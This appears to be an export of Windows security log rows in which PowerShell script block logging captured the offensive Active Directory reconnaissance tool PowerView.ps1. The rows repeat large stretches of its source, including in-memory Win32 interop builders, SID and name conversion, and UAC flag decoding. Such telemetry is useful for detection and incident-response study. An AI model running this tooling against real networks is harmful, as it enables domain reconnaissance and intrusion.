Reflection.AssemblyName($ModuleName)    $Domain = [AppDomain]::CurrentDomain    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)    return $ModuleBuilder}# A helper function used to reduce typing while defining function# prototypes for Add-Win32Type.function func{    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [String]        $DllName,        [Parameter(Position = 1, Mandatory = $True)]        [String]        $FunctionName,        [Parameter(Position = 2, Mandatory = $True)]        [Type]        $ReturnType,        [Parameter(Position = 3)]        [Type[]]        $ParameterTypes,        [Parameter(Position = 4)]        [Runtime.InteropServices.CallingConvention]        $NativeCallingConvention,        [Parameter(Position = 5)]        [Runtime.InteropServices.CharSet]        $Charset,        [Switch]        $SetLastError    )    $Properties = @{        DllName = $DllName        FunctionName = $FunctionName        ReturnType = $ReturnType    }    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }    if ($Charset) { $Properties['Charset'] = $Charset }    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }    New-Object PSObject -Property $Properties}function Add-Win32Type{<#    .SYNOPSIS        Creates a .NET type for an unmanaged Win32 function.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: func    .DESCRIPTION        Add-Win32Type enables you to easily interact with unmanaged (i.e.        Win32 unmanaged) functions in PowerShell. After providing        Add-Win32Type with a function signature, a .NET type is created        using reflection (i.e. csc.exe is never called like with Add-Type).        The 'func' helper function can be used to reduce typing when defining        multiple function definitions.    .PARAMETER DllName        The name of the DLL.    .PARAMETER FunctionName        The name of the target function.    .PARAMETER ReturnType        The return type of the function.    .PARAMETER ParameterTypes        The function parameters.    .PARAMETER NativeCallingConvention        Specifies the native calling convention of the function. Defaults to        stdcall.    .PARAMETER Charset        If you need to explicitly call an 'A' or 'W' Win32 function, you can        specify the character set.    .PARAMETER SetLastError        Indicates whether the callee calls the SetLastError Win32 API        function before returning from the attributed method.    .PARAMETER Module        The in-memory module that will host the functions. Use        New-InMemoryModule to define an in-memory module.    .PARAMETER Namespace        An optional namespace to prepend to the type. Add-Win32Type defaults        to a namespace consisting only of the name of the DLL.    .EXAMPLE        $Mod = New-InMemoryModule -ModuleName Win32        $FunctionDefinitions = @(          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())        )        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'        $Kernel32 = $Types['kernel32']        $Ntdll = $Types['ntdll']        $Ntdll::RtlGetCurrentPeb()        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')    .NOTES        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189        When defining multiple function prototypes, it is ideal to provide        Add-Win32Type with an array of function signatures. That way, they        are all incorporated into the same in-memory module.#>    [OutputType([Hashtable])]    Param(        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [String]        $DllName,        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [String]        $FunctionName,        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]        [Type]        $ReturnType,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Type[]]        $ParameterTypes,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Runtime.InteropServices.CallingConvention]        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Runtime.InteropServices.CharSet]        $Charset = [Runtime.InteropServices.CharSet]::Auto,        [Parameter(ValueFromPipelineByPropertyName = $True)]        [Switch]        $SetLastError,        [Parameter(Mandatory = $True)]        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]        $Module,        [ValidateNotNull()]        [String]        $Namespace = ''    )    BEGIN    {        $TypeHash = @{}    }    PROCESS    {        if ($Module -is [Reflection.Assembly])        {            if ($Namespace)            {                $TypeHash[$DllName] = $Module.GetType(""$Namespace.$DllName"")            }            else            {                $TypeHash[$DllName] = $Module.GetType($DllName)            }        }        else        {            # Define one type for each DLL            if (!$TypeHash.ContainsKey($DllName))            {                if ($Namespace)                {                    $TypeHash[$DllName] = $Module.DefineType(""$Namespace.$DllName"", 'Public,BeforeFieldInit')                }                else                {                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')                }            }            $Method = $TypeHash[$DllName].DefineMethod(                $FunctionName,                'Public,Static,PinvokeImpl',                $ReturnType,                $ParameterTypes)            # Make each ByRef parameter an Out parameter            $i = 1            ForEach($Parameter in $ParameterTypes)            {                if ($Parameter.IsByRef)                {                    [void] $Method.DefineParameter($i, 'Out', $Null)                }                $i++            }            $DllImport = [Runtime.InteropServices.DllImportAttribute]            $SetLastErrorField = $DllImport.GetField('SetLastError')            $CallingConventionField = $DllImport.GetField('CallingConvention')            $CharsetField = $DllImport.GetField('CharSet')            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }            # Equivalent to C# version of [DllImport(DllName)]            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))            $Method.SetCustomAttribute($DllImportAttribute)        }    }    END    {        if ($Module -is [Reflection.Assembly])        {            return $TypeHash        }        $ReturnTypes = @{}        ForEach ($Key in $TypeHash.Keys)        {            $Type = $TypeHash[$Key].CreateType()            $ReturnTypes[$Key] = $Type        }        return $ReturnTypes    }}function psenum{<#    .SYNOPSIS        Creates an in-memory enumeration for use in your PowerShell session.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: None         .DESCRIPTION        The 'psenum' function facilitates the creation of enums entirely in        memory using as close to a ""C style"" as PowerShell will allow.    .PARAMETER Module        The in-memory module that will host the enum. Use        New-InMemoryModule to define an in-memory module.    .PARAMETER FullName        The fully-qualified name of the enum.    .PARAMETER Type        The type of each enum element.    .PARAMETER EnumElements        A hashtable of enum elements.    .PARAMETER Bitfield        Specifies that the enum should be treated as a bitfield.    .EXAMPLE        $Mod = New-InMemoryModule -ModuleName Win32        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{            UNKNOWN =                  0            NATIVE =                   1 # Image doesn't require a subsystem.            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.            POSIX_CUI =                7 # Image runs in the Posix character subsystem.            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.            EFI_APPLICATION =          10            EFI_BOOT_SERVICE_DRIVER =  11            EFI_RUNTIME_DRIVER =       12            EFI_ROM =                  13            XBOX =                     14            WINDOWS_BOOT_APPLICATION = 16        }    .NOTES        PowerShell purists may disagree with the naming of this function but        again, this was developed in such a way so as to emulate a ""C style""        definition as closely as possible. Sorry, I'm not going to name it        New-Enum. :P#>    [OutputType([Type])]    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]        $Module,        [Parameter(Position = 1, Mandatory = $True)]        [ValidateNotNullOrEmpty()]        [String]        $FullName,        [Parameter(Position = 2, Mandatory = $True)]        [Type]        $Type,        [Parameter(Position = 3, Mandatory = $True)]        [ValidateNotNullOrEmpty()]        [Hashtable]        $EnumElements,        [Switch]        $Bitfield    )    if ($Module -is [Reflection.Assembly])    {        return ($Module.GetType($FullName))    }    $EnumType = $Type -as [Type]    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)    if ($Bitfield)    {        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)    }    ForEach ($Key in $EnumElements.Keys)    {        # Apply the specified enum type to each element        $Null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)    }    $EnumBuilder.CreateType()}# A helper function used to reduce typing while defining struct# fields.function field{    Param    (        [Parameter(Position = 0, Mandatory = $True)]        [UInt16]        $Position,        [Parameter(Position = 1, Mandatory = $True)]        [Type]        $Type,        [Parameter(Position = 2)]        [UInt16]        $Offset,        [Object[]]        $MarshalAs    )    @{        Position = $Position        Type = $Type -as [Type]        Offset = $Offset        MarshalAs = $MarshalAs    }}function struct{<#    .SYNOPSIS        Creates an in-memory struct for use in your PowerShell session.        Author: Matthew Graeber (@mattifestation)        License: BSD 3-Clause        Required Dependencies: None        Optional Dependencies: field    .DESCRIPTION        The 'struct'","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"A3V3ypsB8mE-0EyZnn9Y","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (3 of 26):Address.'        }    }    end {}}function Convert-NameToSid {<#    .SYNOPSIS        Converts a given user/group name to a security identifier (SID).    .PARAMETER ObjectName        The user/group name to convert, can be 'user' or 'DOMAIN\user' format.    .PARAMETER Domain        Specific domain for the given user account, defaults to the current domain.    .EXAMPLE        PS C:\> Convert-NameToSid 'DEV\dfm'#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        [Alias('Name')]        $ObjectName,        [String]        $Domain = (Get-NetDomain).Name    )    process {                $ObjectName = $ObjectName -replace ""/"",""\""                if($ObjectName.contains(""\"")) {            # if we get a DOMAIN\user format, auto convert it            $Domain = $ObjectName.split(""\"")[0]            $ObjectName = $ObjectName.split(""\"")[1]        }        try {            $Obj = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value        }        catch {            Write-Verbose ""Invalid object/name: $Domain\$ObjectName""            $Null        }    }}function Convert-SidToName {<#    .SYNOPSIS            Converts a security identifier (SID) to a group/user name.    .PARAMETER SID            The SID to convert.    .EXAMPLE        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        $SID    )    process {        try {            $SID2 = $SID.trim('*')            # try to resolve any built-in SIDs first            #   from https://support.microsoft.com/en-us/kb/243330            Switch ($SID2)            {                'S-1-0'         { 'Null Authority' }                'S-1-0-0'       { 'Nobody' }                'S-1-1'         { 'World Authority' }                'S-1-1-0'       { 'Everyone' }                'S-1-2'         { 'Local Authority' }                'S-1-2-0'       { 'Local' }                'S-1-2-1'       { 'Console Logon ' }                'S-1-3'         { 'Creator Authority' }                'S-1-3-0'       { 'Creator Owner' }                'S-1-3-1'       { 'Creator Group' }                'S-1-3-2'       { 'Creator Owner Server' }                'S-1-3-3'       { 'Creator Group Server' }                'S-1-3-4'       { 'Owner Rights' }                'S-1-4'         { 'Non-unique Authority' }                'S-1-5'         { 'NT Authority' }                'S-1-5-1'       { 'Dialup' }                'S-1-5-2'       { 'Network' }                'S-1-5-3'       { 'Batch' }                'S-1-5-4'       { 'Interactive' }                'S-1-5-6'       { 'Service' }                'S-1-5-7'       { 'Anonymous' }                'S-1-5-8'       { 'Proxy' }                'S-1-5-9'       { 'Enterprise Domain Controllers' }                'S-1-5-10'      { 'Principal Self' }                'S-1-5-11'      { 'Authenticated Users' }                'S-1-5-12'      { 'Restricted Code' }                'S-1-5-13'      { 'Terminal Server Users' }                'S-1-5-14'      { 'Remote Interactive Logon' }                'S-1-5-15'      { 'This Organization ' }                'S-1-5-17'      { 'This Organization ' }                'S-1-5-18'      { 'Local System' }                'S-1-5-19'      { 'NT Authority' }                'S-1-5-20'      { 'NT Authority' }                'S-1-5-80-0'    { 'All Services ' }                'S-1-5-32-544'  { 'BUILTIN\Administrators' }                'S-1-5-32-545'  { 'BUILTIN\Users' }                'S-1-5-32-546'  { 'BUILTIN\Guests' }                'S-1-5-32-547'  { 'BUILTIN\Power Users' }                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }                'S-1-5-32-552'  { 'BUILTIN\Replicators' }                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }                Default {                     $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value                }            }        }        catch {            # Write-Warning ""Invalid SID: $SID""            $SID        }    }}function Convert-NT4toCanonical {<#    .SYNOPSIS        Converts a user/group NT4 name (i.e. dev/john) to canonical format.        Based on Bill Stewart's code from this article:             http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats    .PARAMETER ObjectName        The user/group name to convert, needs to be in 'DOMAIN\user' format.    .EXAMPLE        PS C:\> Convert-NT4toCanonical -ObjectName ""dev\dfm""                Returns ""dev.testlab.local/Users/Dave""    .LINK        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        $ObjectName    )    process {        $ObjectName = $ObjectName -replace ""/"",""\""                if($ObjectName.contains(""\"")) {            # if we get a DOMAIN\user format, try to extract the domain            $Domain = $ObjectName.split(""\"")[0]        }        # Accessor functions to simplify calls to NameTranslate        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {            $Output = $Object.GetType().InvokeMember($Method, ""InvokeMethod"", $Null, $Object, $Parameters)            if ( $Output ) { $Output }        }        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {            [Void] $Object.GetType().InvokeMember($Property, ""SetProperty"", $Null, $Object, $Parameters)        }        $Translate = New-Object -ComObject NameTranslate        try {            Invoke-Method $Translate ""Init"" (1, $Domain)        }        catch [System.Management.Automation.MethodInvocationException] {             Write-Debug ""Error with translate init in Convert-NT4toCanonical: $_""        }        Set-Property $Translate ""ChaseReferral"" (0x60)        try {            Invoke-Method $Translate ""Set"" (3, $ObjectName)            (Invoke-Method $Translate ""Get"" (2))        }        catch [System.Management.Automation.MethodInvocationException] {            Write-Debug ""Error with translate Set/Get in Convert-NT4toCanonical: $_""        }    }}function Convert-CanonicaltoNT4 {<#    .SYNOPSIS        Converts a user@fqdn to NT4 format.    .PARAMETER ObjectName        The user/group name to convert, needs to be in 'DOMAIN\user' format.    .LINK        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats#>    [CmdletBinding()]    param(        [String] $ObjectName    )    $Domain = ($ObjectName -split ""@"")[1]    $ObjectName = $ObjectName -replace ""/"",""\""    # Accessor functions to simplify calls to NameTranslate    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {        $output = $object.GetType().InvokeMember($method, ""InvokeMethod"", $NULL, $object, $parameters)        if ( $output ) { $output }    }    function Set-Property([__ComObject] $object, [String] $property, $parameters) {        [Void] $object.GetType().InvokeMember($property, ""SetProperty"", $NULL, $object, $parameters)    }    $Translate = New-Object -comobject NameTranslate    try {        Invoke-Method $Translate ""Init"" (1, $Domain)    }    catch [System.Management.Automation.MethodInvocationException] { }    Set-Property $Translate ""ChaseReferral"" (0x60)    try {        Invoke-Method $Translate ""Set"" (5, $ObjectName)        (Invoke-Method $Translate ""Get"" (3))    }    catch [System.Management.Automation.MethodInvocationException] { $_ }}function ConvertFrom-UACValue {<#    .SYNOPSIS        Converts a UAC int value to human readable form.    .PARAMETER Value        The int UAC value to convert.    .PARAMETER ShowAll        Show all UAC values, with a + indicating the value is currently set.    .EXAMPLE        PS C:\> ConvertFrom-UACValue -Value 66176        Convert the UAC value 66176 to human readable format.    .EXAMPLE        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue        Convert the UAC value for 'jason' to human readable format.    .EXAMPLE        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll        Convert the UAC value for 'jason' to human readable format, showing all        possible UAC values.#>        [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        $Value,        [Switch]        $ShowAll    )    begin {        # values from https://support.microsoft.com/en-us/kb/305144        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary        $UACValues.Add(""SCRIPT"", 1)        $UACValues.Add(""ACCOUNTDISABLE"", 2)        $UACValues.Add(""HOMEDIR_REQUIRED"", 8)        $UACValues.Add(""LOCKOUT"", 16)        $UACValues.Add(""PASSWD_NOTREQD"", 32)        $UACValues.Add(""PASSWD_CANT_CHANGE"", 64)        $UACValues.Add(""ENCRYPTED_TEXT_PWD_ALLOWED"", 128)        $UACValues.Add(""TEMP_DUPLICATE_ACCOUNT"", 256)        $UACValues.Add(""NORMAL_ACCOUNT"", 512)        $UACValues.Add(""INTERDOMAIN_TRUST_ACCOUNT"", 2048)        $UACValues.Add(""WORKSTATION_TRUST_ACCOUNT"", 4096)        $UACValues.Add(""SERVER_TRUST_ACCOUNT"", 8192)        $UACValues.Add(""DONT_EXPIRE_PASSWORD"", 65536)        $UACValues.Add(""MNS_LOGON_ACCOUNT"", 131072)        $UACValues.Add(""SMARTCARD_REQUIRED"", 262144)        $UACValues.Add(""TRUSTED_FOR_DELEGATION"", 524288)        $UACValues.Add(""NOT_DELEGATED"", 1048576)        $UACValues.Add(""USE_DES_KEY_ONLY"", 2097152)        $UACValues.Add(""DONT_REQ_PREAUTH"", 4194304)        $UACValues.Add(""PASSWORD_EXPIRED"", 8388608)        $UACValues.Add(""TRUSTED_TO_AUTH_FOR_DELEGATION"", 16777216)        $UACValues.Add(""PARTIAL_SECRETS_ACCOUNT"", 67108864)    }    process {        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary        if($Value -is [Int]) {            $IntValue = $Value        }        if ($Value -is [PSCustomObject]) {            if($Value.useraccountcontrol) {                $IntValue = $Value.useraccountcontrol            }        }        if($IntValue) {            if($ShowAll) {                foreach ($UACValue in $UACValues.GetEnumerator()) {                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)+"")                    }                    else {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)"")                    }                }            }            else {                foreach ($UACValue in $UACValues.GetEnumerator()) {                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {                        $ResultUACValues.Add($UACValue.Name, ""$($UACValue.Value)"")                    }                }                            }        }        $ResultUACValues    }}function Get-Proxy {<#    .SYNOPSIS            Enumerates the proxy server and WPAD conents for the current user.    .PARAMETER ComputerName        The computername to enumerate proxy settings on, defaults to local host.    .EXAMPLE        PS C:\> Get-Proxy                 Returns the current proxy settings.#>    param(        [Parameter(ValueFromPipeline=$True)]        [ValidateNotNullOrEmpty()]        [String]        $ComputerName = $ENV:COMPUTERNAME    )    process {        try {            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)            $RegKey = $Reg.OpenSubkey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"")            $ProxyServer = $RegKey.GetValue('ProxyServer')            $AutoConfigURL = $RegKey.GetValue('AutoConfigURL')            if($AutoConfigURL -and ($AutoConfigURL -ne """")) {                try {                    $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)                }                catch {                    $Wpad = """"                }            }            elScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","Address.'        }    }    end {}}function Convert-NameToSid {<#    .SYNOPSIS        Converts a given user/group name to a security identifier (SID).    .PARAMETER ObjectName        The user/group name to convert, can be 'user' or 'DOMAIN\user' format.    .PARAMETER Domain        Specific domain for the given user account, defaults to the current domain.    .EXAMPLE        PS C:\> Convert-NameToSid 'DEV\dfm'#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        [Alias('Name')]        $ObjectName,        [String]        $Domain = (Get-NetDomain).Name    )    process {                $ObjectName = $ObjectName -replace ""/"",""\""                if($ObjectName.contains(""\"")) {            # if we get a DOMAIN\user format, auto convert it            $Domain = $ObjectName.split(""\"")[0]            $ObjectName = $ObjectName.split(""\"")[1]        }        try {            $Obj = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))            $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value        }        catch {            Write-Verbose ""Invalid object/name: $Domain\$ObjectName""            $Null        }    }}function Convert-SidToName {<#    .SYNOPSIS            Converts a security identifier (SID) to a group/user name.    .PARAMETER SID            The SID to convert.    .EXAMPLE        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        $SID    )    process {        try {            $SID2 = $SID.trim('*')            # try to resolve any built-in SIDs first            #   from https://support.microsoft.com/en-us/kb/243330            Switch ($SID2)            {                'S-1-0'         { 'Null Authority' }                'S-1-0-0'       { 'Nobody' }                'S-1-1'         { 'World Authority' }                'S-1-1-0'       { 'Everyone' }                'S-1-2'         { 'Local Authority' }                'S-1-2-0'       { 'Local' }                'S-1-2-1'       { 'Console Logon ' }                'S-1-3'         { 'Creator Authority' }                'S-1-3-0'       { 'Creator Owner' }                'S-1-3-1'       { 'Creator Group' }                'S-1-3-2'       { 'Creator Owner Server' }                'S-1-3-3'       { 'Creator Group Server' }                'S-1-3-4'       { 'Owner Rights' }                'S-1-4'         { 'Non-unique Authority' }                'S-1-5'         { 'NT Authority' }                'S-1-5-1'       { 'Dialup' }                'S-1-5-2'       { 'Network' }                'S-1-5-3'       { 'Batch' }                'S-1-5-4'       { 'Interactive' }                'S-1-5-6'       { 'Service' }                'S-1-5-7'       { 'Anonymous' }                'S-1-5-8'       { 'Proxy' }                'S-1-5-9'       { 'Enterprise Domain Controllers' }                'S-1-5-10'      { 'Principal Self' }                'S-1-5-11'      { 'Authenticated Users' }                'S-1-5-12'      { 'Restricted Code' }                'S-1-5-13'      { 'Terminal Server Users' }                'S-1-5-14'      { 'Remote Interactive Logon' }                'S-1-5-15'      { 'This Organization ' }                'S-1-5-17'      { 'This Organization ' }                'S-1-5-18'      { 'Local System' }                'S-1-5-19'      { 'NT Authority' }                'S-1-5-20'      { 'NT Authority' }                'S-1-5-80-0'    { 'All Services ' }                'S-1-5-32-544'  { 'BUILTIN\Administrators' }                'S-1-5-32-545'  { 'BUILTIN\Users' }                'S-1-5-32-546'  { 'BUILTIN\Guests' }                'S-1-5-32-547'  { 'BUILTIN\Power Users' }                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }                'S-1-5-32-552'  { 'BUILTIN\Replicators' }                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }                Default {                     $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value                }            }        }        catch {            # Write-Warning ""Invalid SID: $SID""            $SID        }    }}function Convert-NT4toCanonical {<#    .SYNOPSIS        Converts a user/group NT4 name (i.e. dev/john) to canonical format.        Based on Bill Stewart's code from this article:             http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats    .PARAMETER ObjectName        The user/group name to convert, needs to be in 'DOMAIN\user' format.    .EXAMPLE        PS C:\> Convert-NT4toCanonical -ObjectName ""dev\dfm""                Returns ""dev.testlab.local/Users/Dave""    .LINK        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats#>    [CmdletBinding()]    param(        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]        [String]        $ObjectName    )    process {        $ObjectName = $ObjectName -replace ""/"",""\""                if($ObjectName.contains(""\"")) {            # if we get a DOMAIN\user format, try to extract the domain            $Domain = $ObjectName.split(""\"")[0]        }        # Accessor functions to simplify calls to NameTranslate        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {            $Output = $Object.GetType().InvokeMember($Method, ""InvokeMethod"", $Null, $Object, $Parameters)            if ( $Output ) { $Output }        }        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {            [Void] $Object.GetType().InvokeMember($Property, ""SetProperty"", $Null, $Object, $Parameters)        }        $Translate = New-Object -ComObject NameTranslate        try {            Invoke-Method $Translate ""Init"" (1, $Domain)        }        catch [System.Management.Automation.MethodInvocationException] {             Write-Debug ""Error with translate init in Convert-NT4toCanonical: $_""        }        Set-Property $Translate ""ChaseReferral"" (0x60)        try {            Invoke-Method $Translate ""Set"" (3, $ObjectName)            (Invoke-Method $Translate ""Get"" (2))        }        catch [System.Management.Automation.MethodInvocationException] {            Write-Debug ""Error with translate Set/Get in Convert-NT4toCanonical: $_""        }    }}function Convert-CanonicaltoNT4 {<#    .SYNOPSIS        Converts a user@fqdn to NT4 format.    .PARAMETER ObjectName        The user/group name to convert, needs to be in 'DOMAIN\user' format.    .LINK        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats#>    [CmdletBinding()]    param(        [String] $ObjectName    )    $Domain = ($ObjectName -split ""@"")[1]    $ObjectName = $ObjectName -replace ""/"",""\""    # Accessor functions to simplify calls to NameTranslate    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {        $output = $object.GetType().InvokeMember($method, ""InvokeMethod"", $NULL, $object, $parameters)        if ( $output ) { $output }    }    function Set-Property([__ComObject] $object, [String] $property, $parameters) {        [Void] $object.GetType().InvokeMember($property, ""SetProperty"", $NULL, $object, $parameters)    }    $Translate = New-Object -comobject NameTranslate    try {        Invoke-Method $Translate ""Init"" (1, $Domain)    }    catch [System.Management.Automation.MethodInvocationException] { }    Set-Property $Translate ""ChaseReferral"" (0x60)    try {        Invoke-Method $Translate ""Set"" (5, $ObjectName)        (Invoke-Method $Translate ""Get"" (3))    }    catch [System.Management.Automation.MethodInvocationException] { $_ }}function ConvertFrom-UACValue {<#    .SYNOPSIS        Converts a UAC int value to human readable form.    .PARAMETER Value        The int UAC value to convert.    .PARAMETER ShowAll        Show all UAC values, with a + indicating the value is currently set.    .EXAMPLE        PS C:\> ConvertFrom-UACValue -Value 66176        Convert the UAC value 66176 to human readable format.    .EXAMPLE        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue        Convert the UAC value for 'jason' to human readable format.    .EXAMPLE        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll    